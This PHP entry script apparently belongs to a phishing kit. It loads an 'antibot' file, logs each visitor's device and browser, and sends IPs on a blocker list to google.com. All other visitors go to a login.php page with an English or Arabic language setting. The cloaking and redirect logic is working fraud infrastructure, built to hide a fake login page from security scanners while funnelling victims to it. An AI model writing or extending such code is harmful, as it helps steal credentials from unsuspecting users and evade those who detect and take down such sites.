<?php
    session_start();
    include "./Assets/php/config/config.php";   
    include "./Assets/php/prevents/antibot.php";
    $lang = Detectlang();
    $visitors = Visitors();
    get_device_and_browser();
    $file = "./data/blocker.json";
    $data = json_decode(file_get_contents($file),true);
    if (in_array(get_client_ip(),$data)) {
        header('Location: https://google.com/');
        exit();
    }else{

        if ($lang !== "en" && $lang !== "ar") {
            $lang = "en";
        }else{
            $lang = Detectlang();
        }

        header('Location: ./login.php?lang='.$lang.'');
        exit();
    }
    exit;

?>